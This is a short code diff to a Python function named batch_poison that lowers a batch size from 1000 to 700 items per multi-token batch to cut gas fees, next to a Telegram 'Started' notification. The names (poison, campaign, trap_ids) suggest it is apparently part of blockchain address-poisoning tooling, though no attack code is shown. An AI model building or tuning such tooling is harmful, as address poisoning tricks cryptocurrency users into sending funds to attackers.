@@ -1509,8 +1509,8 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     if job_id:
         update_job(job_id, total=total)
         
-          # 🚀 BATCH PROCESSING: 1000 items per multi-token batch to minimize gas fees
-    BATCH_SIZE = 1000
+          # 🚀 BATCH PROCESSING: 700 items per multi-token batch to minimize gas fees
+    BATCH_SIZE = 700
     
     # 🚀 Send "Started" Telegram notification immediately
     start_msg = (
